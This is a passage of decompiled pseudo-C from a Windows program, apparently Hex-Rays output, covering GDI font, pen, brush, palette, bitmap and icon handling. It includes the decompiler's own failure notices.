        lf.lfWeight = 400;
      lf.lfItalic = (*(_BYTE *)(v14 + 25) & 2) != 0;
      lf.lfUnderline = (*(_BYTE *)(v14 + 25) & 4) != 0;
      lf.lfStrikeOut = (*(_BYTE *)(v14 + 25) & 8) != 0;
      lf.lfCharSet = *(_BYTE *)(v14 + 26);
      sub_4044C8(&v12, (char *)(v14 + 27));
      if ( sub_407B28(v12, "Default") )
      {
        sub_4044C8(&v10, (char *)(v14 + 27));
        sub_40814C(lf.lfFaceName, v10);
      }
      else
      {
        sub_4044C8(&v11, aMsSansSerif);
        sub_40814C(lf.lfFaceName, v11);
      }
      lf.lfQuality = 0;
      lf.lfOutPrecision = 0;
      lf.lfClipPrecision = 0;
      v2 = sub_421188(a1) - 1;
      if ( v2 )
        lf.lfPitchAndFamily = v2 == 1;
      else
        lf.lfPitchAndFamily = 2;
      v3 = CreateFontIndirectA(&lf);
      *(_DWORD *)(v14 + 8) = v3;
    }
    __writefsdword(0, v6[0]);
    v7 = (int *)&loc_421148;
    sub_4209D0(dword_42CC4C);
  }
  v4 = *(_DWORD *)(v14 + 8);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_421170;
  sub_404290((int)&v10, 3);
  return v4;
}
// 42CC4C: using guessed type int dword_42CC4C;

//----- (00421188) --------------------------------------------------------
char __usercall sub_421188@<al>(int a1@<eax>)
{
  return *(_BYTE *)(*(_DWORD *)(a1 + 16) + 24);
}

//----- (00421190) --------------------------------------------------------
int __usercall sub_421190@<eax>(int a1@<eax>)
{
  HPEN v1; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v4; // [esp-4h] [ebp-18h]
  LOGPEN plpen; // [esp+0h] [ebp-14h] BYREF
  int v6; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v6 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v6 + 8) )
  {
    sub_4209C4(dword_42CC50);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_421216;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    if ( !*(_DWORD *)(v6 + 8) )
    {
      plpen.lopnStyle = (unsigned __int16)word_42B754[*(unsigned __int8 *)(v6 + 28)];
      plpen.lopnWidth.x = *(_DWORD *)(v6 + 24);
      plpen.lopnColor = sub_420DDC(*(_DWORD *)(v6 + 20));
      v1 = CreatePenIndirect(&plpen);
      *(_DWORD *)(v6 + 8) = v1;
    }
    __writefsdword(0, v3[0]);
    v4 = (int *)&loc_42121D;
    sub_4209D0(dword_42CC50);
  }
  return *(_DWORD *)(v6 + 8);
}
// 42B754: using guessed type __int16 word_42B754[8];
// 42CC50: using guessed type int dword_42CC50;

//----- (00421228) --------------------------------------------------------
int __usercall sub_421228@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 16) + 20);
}

//----- (00421230) --------------------------------------------------------
int __usercall sub_421230@<eax>(int a1@<eax>)
{
  int v1; // eax
  char v2; // al
  HBRUSH v3; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v6; // [esp-8h] [ebp-18h]
  int *v7; // [esp-4h] [ebp-14h]
  LOGBRUSH plbrush; // [esp+0h] [ebp-10h] BYREF
  int v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v9 + 8) )
  {
    sub_4209C4(dword_42CC54);
    v7 = &savedregs;
    v6 = &loc_4212FD;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    if ( !*(_DWORD *)(v9 + 8) )
    {
      v1 = *(_DWORD *)(v9 + 24);
      if ( v1 )
      {
        (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, int))(*(_DWORD *)v1 + 108))(
          ExceptionList,
          v6,
          v7,
          3);
        plbrush.lbHatch = (*(int (**)(void))(**(_DWORD **)(v9 + 24) + 100))();
      }
      else
      {
        plbrush.lbHatch = 0;
        v2 = *(_BYTE *)(v9 + 28);
        if ( v2 )
        {
          if ( v2 == 1 )
          {
            plbrush.lbStyle = 1;
          }
          else
          {
            plbrush.lbStyle = 2;
            plbrush.lbHatch = (v2 & 0x7F) - 2;
          }
        }
        else
        {
          plbrush.lbStyle = 0;
        }
      }
      plbrush.lbColor = sub_420DDC(*(_DWORD *)(v9 + 20));
      v3 = CreateBrushIndirect(&plbrush);
      *(_DWORD *)(v9 + 8) = v3;
    }
    __writefsdword(0, (unsigned int)ExceptionList);
    v7 = (int *)&loc_421304;
    sub_4209D0(dword_42CC54);
  }
  return *(_DWORD *)(v9 + 8);
}
// 42CC54: using guessed type int dword_42CC54;

//----- (00421310) --------------------------------------------------------
char __usercall sub_421310@<al>(int a1@<eax>)
{
  return *(_BYTE *)(*(_DWORD *)(a1 + 16) + 28);
}

//----- (00421318) --------------------------------------------------------
void __usercall sub_421318(int a1@<eax>)
{
  EnterCriticalSection_0(&stru_42CC34);
  ++*(_DWORD *)(a1 + 80);
  LeaveCriticalSection_0(&stru_42CC34);
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 56));
}

//----- (00421340) --------------------------------------------------------
BOOL __usercall sub_421340@<eax>(int y@<ecx>, int x@<edx>, int a3@<eax>)
{
  int v4; // esi

  v4 = x;
  LOBYTE(x) = 1;
  sub_4214E4(y, x);
  return MoveToEx(*(HDC *)(a3 + 4), v4, y, 0);
}
// 4214E4: using guessed type int __fastcall sub_4214E4(_DWORD, _DWORD);

//----- (0042136C) --------------------------------------------------------
bool __usercall sub_42136C@<al>(int a1@<eax>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  bool v5; // [esp+7h] [ebp-1h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  EnterCriticalSection_0(&stru_42CC34);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_4213B8;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  v5 = *(_DWORD *)(a1 + 80) == 0;
  if ( v5 )
    sub_421318(a1);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_4213BF;
  LeaveCriticalSection_0(&stru_42CC34);
  return v5;
}

//----- (004213C8) --------------------------------------------------------
void __usercall sub_4213C8(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 56));
  EnterCriticalSection_0(&stru_42CC34);
  --*(_DWORD *)(a1 + 80);
  LeaveCriticalSection_0(&stru_42CC34);
}

//----- (004213F0) --------------------------------------------------------
BOOL __usercall sub_4213F0@<eax>(int a1@<eax>, struct tagPOINT *a2@<edx>, int a3@<ecx>)
{
  struct tagPOINT *v3; // esi

  v3 = a2;
  LOBYTE(a2) = 1;
  sub_4214E4(a3, a2);
  return GetCurrentPositionEx(*(HDC *)(a1 + 4), v3);
}
// 4214E4: using guessed type int __fastcall sub_4214E4(_DWORD, _DWORD);

//----- (00421414) --------------------------------------------------------
BOOL __usercall sub_421414@<eax>(int a1@<eax>, int *a2@<edx>)
{
  return sub_421340(a2[1], *a2, a1);
}

//----- (00421434) --------------------------------------------------------
char __usercall sub_421434@<al>(int a1@<eax>)
{
  int v1; // ebx
  HDC v2; // esi

  v1 = a1;
  v2 = *(HDC *)(a1 + 4);
  if ( v2 )
  {
    LOBYTE(a1) = *(_BYTE *)(a1 + 8) & 0xF1;
    if ( *(_BYTE *)(v1 + 8) != (_BYTE)a1 )
    {
      SelectObject(v2, h);
      SelectObject(*(HDC *)(v1 + 4), dword_42CC10);
      SelectObject(*(HDC *)(v1 + 4), dword_42CC14);
      LOBYTE(a1) = *(_BYTE *)(v1 + 8) & 0xF1;
      *(_BYTE *)(v1 + 8) = a1;
    }
  }
  return a1;
}

//----- (00421490) --------------------------------------------------------
int __usercall sub_421490@<eax>(int a1@<eax>, int a2@<edx>)
{
  int result; // eax
  int v5; // ecx
  struct tagPOINT v6; // [esp+0h] [ebp-10h] BYREF

  result = *(_DWORD *)(a1 + 4);
  if ( a2 != result )
  {
    if ( result )
    {
      sub_421434(a1);
      sub_4213F0(a1, &v6, v5);
      *(struct tagPOINT *)(a1 + 24) = v6;
      result = 0;
      *(_DWORD *)(a1 + 4) = 0;
      *(_BYTE *)(a1 + 8) &= ~1u;
    }
    if ( a2 )
    {
      *(_BYTE *)(a1 + 8) |= 1u;
      *(_DWORD *)(a1 + 4) = a2;
      return sub_421414(a1, (int *)(a1 + 24));
    }
  }
  return result;
}
// 4214AF: variable 'v5' is possibly undefined

//----- (004214E4) --------------------------------------------------------
#error "421521: call analysis failed (funcsize=41)"

//----- (00421558) --------------------------------------------------------
COLORREF __usercall sub_421558@<eax>(int a1@<eax>)
{
  void *v2; // eax
  signed int v3; // eax

  v2 = (void *)sub_420FE0(*(_DWORD *)(a1 + 12));
  SelectObject(*(HDC *)(a1 + 4), v2);
  v3 = sub_420DDC(*(_DWORD *)(*(_DWORD *)(a1 + 12) + 24));
  return SetTextColor(*(HDC *)(a1 + 4), v3);
}

//----- (00421584) --------------------------------------------------------
int __usercall sub_421584@<eax>(int a1@<eax>)
{
  void *v2; // eax

  v2 = (void *)sub_421190(*(_DWORD *)(a1 + 16));
  SelectObject(*(HDC *)(a1 + 4), v2);
  return SetROP2(*(HDC *)(a1 + 4), (unsigned __int16)word_42B764[*(unsigned __int8 *)(*(_DWORD *)(a1 + 16) + 24)]);
}
// 42B764: using guessed type __int16 word_42B764[16];

//----- (004215B4) --------------------------------------------------------
int __usercall sub_4215B4@<eax>(int a1@<eax>)
{
  void *v2; // eax
  void *v3; // eax
  int v4; // eax
  signed int v5; // eax
  int v7; // eax
  signed int v8; // eax

  v2 = (void *)sub_421230(*(_DWORD *)(a1 + 20));
  UnrealizeObject(v2);
  v3 = (void *)sub_421230(*(_DWORD *)(a1 + 20));
  SelectObject(*(HDC *)(a1 + 4), v3);
  if ( sub_421310(*(_DWORD *)(a1 + 20)) )
  {
    v7 = sub_421228(*(_DWORD *)(a1 + 20));
    v8 = sub_420DDC(v7);
    SetBkColor(*(HDC *)(a1 + 4), ~v8);
    return SetBkMode(*(HDC *)(a1 + 4), 1);
  }
  else
  {
    v4 = sub_421228(*(_DWORD *)(a1 + 20));
    v5 = sub_420DDC(v4);
    SetBkColor(*(HDC *)(a1 + 4), v5);
    return SetBkMode(*(HDC *)(a1 + 4), 2);
  }
}

//----- (00421630) --------------------------------------------------------
#error "421641: call analysis failed (funcsize=9)"

//----- (00421648) --------------------------------------------------------
#error "421659: call analysis failed (funcsize=9)"

//----- (00421660) --------------------------------------------------------
int sub_421660()
{
  return sub_421648();
}
// 421648: using guessed type int sub_421648(void);

//----- (0042166C) --------------------------------------------------------
int sub_42166C()
{
  return sub_421648();
}
// 421648: using guessed type int sub_421648(void);

//----- (00421678) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *sub_421678()
{
  _DWORD *v0; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-10h] BYREF
  void *v3; // [esp-8h] [ebp-Ch]
  void **v4; // [esp-4h] [ebp-8h]
  char *v5; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4 = &savedregs;
  v3 = &loc_4216C2;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4063D4(off_42B850, &v5);
  v0 = sub_409568((int)dword_417568, 1, (__int32)v5);
  sub_403CCC((int)v0, (int)ExceptionList, (int)v3, (int)v4, (int)v5);
  __writefsdword(0, (unsigned int)v4);
  savedregs = &loc_4216C9;
  return sub_40426C(&v5);
}
// 4216BC: bad sp value at call
// 417568: using guessed type int dword_417568[4];
// 42B850: using guessed type int **off_42B850;

//----- (004216CC) --------------------------------------------------------
_DWORD *sub_4216CC()
{
  DWORD LastError_0; // ebx
  _DWORD *v1; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-114h] BYREF
  void *v4; // [esp-8h] [ebp-110h]
  int *v5; // [esp-4h] [ebp-10Ch]
  int v6; // [esp+0h] [ebp-108h]
  char *v7; // [esp+4h] [ebp-104h] BYREF
  CHAR Buffer[256]; // [esp+8h] [ebp-100h] BYREF
  int savedregs; // [esp+108h] [ebp+0h] BYREF

  v7 = 0;
  v5 = &savedregs;
  v4 = &loc_421768;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  LastError_0 = GetLastError_0();
  if ( LastError_0 && FormatMessageA(0x1000u, 0, LastError_0, 0x400u, Buffer, 0x100u, 0) )
  {
    sub_4044D4(&v7, Buffer, 256);
    v1 = sub_409568((int)dword_417568, 1, (__int32)v7);
    sub_403CCC((int)v1, (int)ExceptionList, (int)v4, (int)v5, v6);
  }
  else
  {
    sub_421678();
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v5 = (int *)&loc_42176F;
  return sub_40426C(&v7);
}
// 417568: using guessed type int dword_417568[4];

//----- (00421774) --------------------------------------------------------
int __usercall sub_421774@<eax>(int a1@<eax>)
{
  if ( !a1 )
    sub_4216CC();
  return a1;
}

//----- (00421784) --------------------------------------------------------
HGDIOBJ __usercall sub_421784@<eax>(void *a1@<eax>, int *a2@<edx>, char a3@<cl>)
{
  HGDIOBJ v4; // ebx
  HGDIOBJ v5; // esi
  unsigned int v7[2]; // [esp-18h] [ebp-58h] BYREF
  int *v8; // [esp-10h] [ebp-50h]
  unsigned int v9[2]; // [esp-Ch] [ebp-4Ch] BYREF
  int *v10; // [esp-4h] [ebp-44h]
  char pv[4]; // [esp+Ch] [ebp-34h] BYREF
  int wSrc; // [esp+10h] [ebp-30h]
  int hSrc; // [esp+14h] [ebp-2Ch]
  HDC hdcDest; // [esp+24h] [ebp-1Ch]
  HDC hdcSrc; // [esp+28h] [ebp-18h]
  HDC hdc; // [esp+2Ch] [ebp-14h]
  HGDIOBJ Bitmap; // [esp+30h] [ebp-10h]
  int nWidth; // [esp+34h] [ebp-Ch]
  int nHeight; // [esp+38h] [ebp-8h]
  HANDLE h; // [esp+3Ch] [ebp-4h]
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  nWidth = *a2;
  nHeight = a2[1];
  h = a1;
  hdcSrc = CreateCompatibleDC(0);
  hdcDest = CreateCompatibleDC(0);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_4218D2;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  GetObjectA(h, 24, pv);
  if ( a3 )
  {
    Bitmap = CreateBitmap(nWidth, nHeight, 1u, 1u, 0);
  }
  else
  {
    hdc = GetDC(0);
    if ( !hdc )
      sub_4216CC();
    v8 = &savedregs;
    v7[1] = (unsigned int)&loc_421841;
    v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    Bitmap = CreateCompatibleBitmap(hdc, nWidth, nHeight);
    if ( !Bitmap )
      sub_4216CC();
    __writefsdword(0, v7[0]);
    v8 = (int *)&loc_421848;
    ReleaseDC(0, hdc);
  }
  if ( Bitmap )
  {
    v4 = SelectObject(hdcSrc, h);
    v5 = SelectObject(hdcDest, Bitmap);
    StretchBlt(hdcDest, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020u);
    if ( v4 )
      SelectObject(hdcSrc, v4);
    if ( v5 )
      SelectObject(hdcDest, v5);
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_4218D9;
  DeleteDC(hdcSrc);
  DeleteDC(hdcDest);
  return Bitmap;
}
// 421784: using guessed type char pv[4];

//----- (004218E4) --------------------------------------------------------
int __usercall sub_4218E4@<eax>(__int16 a1@<ax>)
{
  if ( a1 == 1 || a1 == 4 || a1 == 8 )
    return 1 << a1;
  else
    return 0;
}

//----- (00421904) --------------------------------------------------------
int __usercall sub_421904@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  return (~(a3 - 1) & (a3 - 1 + a2 * a1)) / 8;
}

//----- (00421918) --------------------------------------------------------
HPALETTE __usercall sub_421918@<eax>(char *a1@<eax>)
{
  int DeviceCaps; // ebx
  struct tagPALETTEENTRY v3; // [esp+0h] [ebp-424h] BYREF
  struct tagPALETTEENTRY v4[4]; // [esp+4h] [ebp-420h] BYREF
  unsigned int v5[2]; // [esp+Ch] [ebp-418h] BYREF
  int *v6; // [esp+14h] [ebp-410h]
  LOGPALETTE plpal; // [esp+1Ch] [ebp-408h] BYREF
  struct tagPALETTEENTRY v8; // [esp+3Ch] [ebp-3E8h] BYREF
  struct tagPALETTEENTRY v9; // [esp+40h] [ebp-3E4h] BYREF
  HDC hdc; // [esp+420h] [ebp-4h]
  int savedregs; // [esp+424h] [ebp+0h] BYREF

  plpal.palVersion = 768;
  plpal.palNumEntries = 16;
  sub_402844(a1, (char *)plpal.palPalEntry, 64);
  hdc = GetDC(0);
  v6 = &savedregs;
  v5[1] = (unsigned int)sub_421A15;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  DeviceCaps = GetDeviceCaps(hdc, 104);
  if ( DeviceCaps >= 16 )
  {
    GetSystemPaletteEntries(hdc, 0, 8u, plpal.palPalEntry);
    if ( v8 == 12632256 )
    {
      GetSystemPaletteEntries(hdc, DeviceCaps - 8, 1u, &v8);
      GetSystemPaletteEntries(hdc, DeviceCaps - 7, 7u, &v4[plpal.palNumEntries]);
      GetSystemPaletteEntries(hdc, 7u, 1u, &v9);
    }
    else
    {
      GetSystemPaletteEntries(hdc, DeviceCaps - 8, 8u, &v3 + plpal.palNumEntries);
    }
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_421A1C;
  ReleaseDC(0, hdc);
  return CreatePalette(&plpal);
}
// 421918: using guessed type struct tagPALETTEENTRY var_420[4];

//----- (00421A30) --------------------------------------------------------
int __userpurge sub_421A30@<eax>(
        BITMAPINFOHEADER *a1@<eax>,
        HGDIOBJ *a2@<edx>,
        struct _EXCEPTION_REGISTRATION_RECORD *a3@<ecx>,
        int *a4)
{
  int v5; // esi
  HBITMAP DIBitmap; // eax
  int v7; // eax
  BITMAPINFOHEADER *v8; // eax
  HBITMAP v9; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v10; // eax
  unsigned int v12[2]; // [esp-18h] [ebp-38h] BYREF
  void **v13; // [esp-10h] [ebp-30h]
  _DWORD v14[6]; // [esp-Ch] [ebp-2Ch] BYREF
  void *pjBits; // [esp+Ch] [ebp-14h]
  HDC hdc; // [esp+10h] [ebp-10h]
  HGDIOBJ ho; // [esp+14h] [ebp-Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+18h] [ebp-8h] BYREF
  BITMAPINFOHEADER *pbmih; // [esp+1Ch] [ebp-4h]
  void *savedregs; // [esp+20h] [ebp+0h] BYREF

  ExceptionList = a3;
  pbmih = a1;
  a1->biHeight = (unsigned int)a1->biHeight >> 1;
  pbmih->biSizeImage = pbmih->biHeight * sub_421904(pbmih->biWidth, pbmih->biBitCount, 32);
  v5 = sub_4218E4(pbmih->biBitCount);
  hdc = GetDC(0);
  if ( !hdc )
    sub_421678();
  v14[2] = &savedregs;
  v14[1] = &loc_421BDC;
  v14[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  pjBits = &pbmih[1].biSize + v5;
  DIBitmap = CreateDIBitmap(hdc, pbmih, 4u, pjBits, (const BITMAPINFO *)pbmih, 0);
  ho = (HGDIOBJ)sub_421774((int)DIBitmap);
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_421B02;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  *a2 = sub_421784(ho, a4, 0);
  __writefsdword(0, v12[0]);
  v13 = (void **)&loc_421B09;
  DeleteObject(ho);
  pjBits = (char *)pjBits + pbmih->biSizeImage;
  pbmih->biBitCount = 1;
  v7 = sub_421904(pbmih->biWidth, 1, 32);
  pbmih->biSizeImage = pbmih->biHeight * v7;
  pbmih->biClrUsed = 2;
  pbmih->biClrImportant = 2;
  v8 = pbmih + 1;
  pbmih[1].biSize = 0;
  v8->biWidth = 0xFFFFFF;
  v9 = CreateDIBitmap((HDC)pbmih, pbmih, 4u, pjBits, (const BITMAPINFO *)pbmih, 0);
  ho = (HGDIOBJ)sub_421774((int)v9);
  savedregs = &savedregs;
  pbmih = (BITMAPINFOHEADER *)&loc_421BBC;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v10 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_421784(ho, a4, 1);
  ExceptionList->Next = v10;
  __writefsdword(0, (unsigned int)ExceptionList);
  savedregs = &loc_421BC3;
  DeleteObject(ho);
  __writefsdword(0, (unsigned int)ExceptionList);
  savedregs = &loc_421BE3;
  return ReleaseDC(0, hdc);
}

//----- (00421BEC) --------------------------------------------------------
int __usercall sub_421BEC@<eax>(int result@<eax>)
{
  if ( !result )
    return 0x7FFFFFFF;
  return result;
}

//----- (00421BF8) --------------------------------------------------------
bool __usercall sub_421BF8@<al>(unsigned __int8 *a1@<eax>, unsigned __int8 *a2@<edx>, int a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // ebx
  int v6; // esi
  int v8; // [esp+Ch] [ebp-8h]

  v3 = **(_DWORD **)(a3 + 8);
  v4 = *a2 - v3;
  v5 = a2[1] - *(_DWORD *)(*(_DWORD *)(a3 + 8) + 4);
  v6 = *a1 - v3;
  v8 = a1[1] - *(_DWORD *)(*(_DWORD *)(a3 + 8) + 4);
  return (int)abs32(v4) <= (int)abs32(v6)
      && (v4 <= 0 || v6 >= v4)
      && (int)abs32(v5) <= (int)abs32(v8)
      && (v5 <= 0 || v5 <= v8);
}

//----- (00421C88) --------------------------------------------------------
int __userpurge sub_421C88@<eax>(int a1@<eax>, HICON *a2@<edx>, int a3@<ecx>, int *a4, int *a5, int a6)
{
  __int16 DeviceCaps; // bx
  unsigned __int16 v7; // bx
  int v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // ebx
  int v12; // ecx
  BITMAPINFOHEADER *v13; // ebx
  LONG v14; // ebx
  const BYTE *v15; // edi
  char *v16; // esi
  HICON Icon; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-88h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v20; // [esp-8h] [ebp-84h] BYREF
  int *v21; // [esp-4h] [ebp-80h]
  int *v22; // [esp+0h] [ebp-7Ch]
  char pv[8]; // [esp+Ch] [ebp-70h] BYREF
  int v24; // [esp+14h] [ebp-68h]
  int v25; // [esp+18h] [ebp-64h]
  unsigned __int16 v26; // [esp+1Ch] [ebp-60h]
  char v27[8]; // [esp+24h] [ebp-58h] BYREF
  int v28; // [esp+2Ch] [ebp-50h]
  int v29; // [esp+30h] [ebp-4Ch]
  unsigned __int16 v30; // [esp+34h] [ebp-48h]
  BYTE v31; // [esp+36h] [ebp-46h]
  char *v32; // [esp+3Ch] [ebp-40h]
  LONG cb; // [esp+40h] [ebp-3Ch]
  struct _EXCEPTION_REGISTRATION_RECORD h; // [esp+44h] [ebp-38h] BYREF
  LPVOID lpvBits; // [esp+4Ch] [ebp-30h]
  char *v36; // [esp+50h] [ebp-2Ch]
  HDC hdc; // [esp+54h] [ebp-28h]
  int v38; // [esp+58h] [ebp-24h]
  int v39; // [esp+5Ch] [ebp-20h]
  int v40; // [esp+60h] [ebp-1Ch]
  int v41; // [esp+64h] [ebp-18h]
  int v42; // [esp+68h] [ebp-14h]
  char *v43; // [esp+6Ch] [ebp-10h]
  int v44; // [esp+70h] [ebp-Ch]
  HICON *v45; // [esp+74h] [ebp-8h]
  int v46; // [esp+78h] [ebp-4h]
  int savedregs; // [esp+7Ch] [ebp+0h] BYREF

  v44 = a3;
  v45 = a2;
  v46 = a1;
  v42 = 16 * a3;
  v43 = sub_4079FC(16 * a3);
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_421F7F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(*(_DWORD *)v46 + 8))(
    v42,
    v43,
    ExceptionList,
    &loc_421F7F,
    &savedregs);
  if ( *(_QWORD *)a5 )
  {
    *a4 = *a5;
    a4[1] = a5[1];
  }
  else
  {
    *a4 = GetSystemMetrics(11);
    a4[1] = GetSystemMetrics(12);
  }
  hdc = GetDC(0);
  if ( !hdc )
    sub_421678();
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_421D71;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  DeviceCaps = GetDeviceCaps(hdc, 14);
  v7 = GetDeviceCaps(hdc, 12) * DeviceCaps;
  if ( v7 <= 8u )
    v40 = 1 << v7;
  else
    v40 = 0x7FFFFFFF;
  __writefsdword(0, (unsigned int)ExceptionList);
  v21 = (int *)&loc_421D78;
  ReleaseDC(0, hdc);
  v38 = 0;
  v39 = sub_421BEC(*((unsigned __int16 *)v43 + 1));
  v8 = v44 - 1;
  if ( v44 - 1 > 0 )
  {
    v9 = 1;
    do
    {
      v10 = sub_421BEC(*(unsigned __int16 *)&v43[16 * v9 + 2]);
      v11 = v10;
      if ( v10 <= v40
        && v10 >= v39
        && sub_421BF8((unsigned __int8 *)&v43[16 * v38], (unsigned __int8 *)&v43[16 * v9], (int)&savedregs) )
      {
        v38 = v9;
        v39 = v11;
      }
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  v32 = &v43[16 * v38];
  *a4 = (unsigned __int8)*v32;
  a4[1] = (unsigned __int8)v32[1];
  v36 = sub_4079FC(*((_DWORD *)v32 + 2));
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_421F5F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  LOWORD(v12) = 1;
  (*(void (__fastcall **)(int, int, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, int *))(*(_DWORD *)v46 + 16))(
    v12,
    *((_DWORD *)v32 + 3) - (a6 + v42),
    ExceptionList,
    &loc_421F5F,
    &savedregs,
    v22);
  v13 = (BITMAPINFOHEADER *)v36;
  (*(void (__fastcall **)(_DWORD, char *))(*(_DWORD *)v46 + 8))(*((_DWORD *)v32 + 2), v36);
  sub_421A30(v13, (HGDIOBJ *)&h.Handler, &h, a4);
  GetObjectA(h.Next, 24, pv);
  GetObjectA(h.Handler, 24, v27);
  v14 = v26 * v24 * v25;
  cb = v30 * v28 * v29;
  v41 = v14 + cb;
  lpvBits = sub_4079FC(v14 + cb);
  v22 = &savedregs;
  v21 = (int *)&loc_421F3C;
  v20 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v20);
  v15 = (const BYTE *)lpvBits;
  v16 = (char *)lpvBits + v14;
  GetBitmapBits((HBITMAP)h.Next, v14, lpvBits);
  GetBitmapBits((HBITMAP)h.Handler, cb, v16);
  DeleteObject(h.Handler);
  DeleteObject(h.Next);
  Icon = CreateIcon(hmod, *a4, a4[1], v30, v31, v15, (const BYTE *)v16);
  *v45 = Icon;
  if ( !*v45 )
    sub_4216CC();
  __writefsdword(0, (unsigned int)v20);
  v22 = (int *)&loc_421F43;
  sub_402700((int)lpvBits);
  __writefsdword(0, (unsigned int)v20);
  v22 = (int *)&loc_421F66;
  sub_402700((int)v36);
  __writefsdword(0, (unsigned int)v20);
  v22 = (int *)&loc_421F86;
  return sub_402700((int)v43);
}
// 421E39: variable 'v12' is possibly undefined
// 421C88: using guessed type char pv[8];
// 421C88: using guessed type char var_58[8];

//----- (00421F90) --------------------------------------------------------
unsigned int __usercall sub_421F90@<eax>(void *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int ObjectA; // eax
  unsigned int result; // eax
  int v7; // ecx
  _DWORD v8[4]; // [esp+0h] [ebp-60h] BYREF
  __int16 v9; // [esp+10h] [ebp-50h]
  __int16 v10; // [esp+12h] [ebp-4Eh]
  int v11[10]; // [esp+18h] [ebp-48h] BYREF

  v11[0] = 0;
  ObjectA = GetObjectA(a1, 84, v8);
  if ( ObjectA )
  {
    if ( ObjectA < 64 || v11[0] < 0x28u )
    {
      sub_402E48((char *)a2, 40, 0);
      *(_DWORD *)a2 = 40;
      *(_DWORD *)(a2 + 4) = v8[1];
      *(_DWORD *)(a2 + 8) = v8[2];
    }
    else
    {
      qmemcpy((void *)a2, v11, 0x28u);
    }
  }
  else
  {
    sub_421660();
  }
  if ( a3 == 2 )
  {
    *(_WORD *)(a2 + 14) = 1;
  }
  else if ( (unsigned int)(a3 - 3) < 0xE )
  {
    *(_WORD *)(a2 + 14) = 4;
    *(_DWORD *)(a2 + 32) = a3;
  }
  else if ( (unsigned int)(a3 - 17) < 0xF0 )
  {
    *(_WORD *)(a2 + 14) = 8;
    *(_DWORD *)(a2 + 32) = a3;
  }
  else
  {
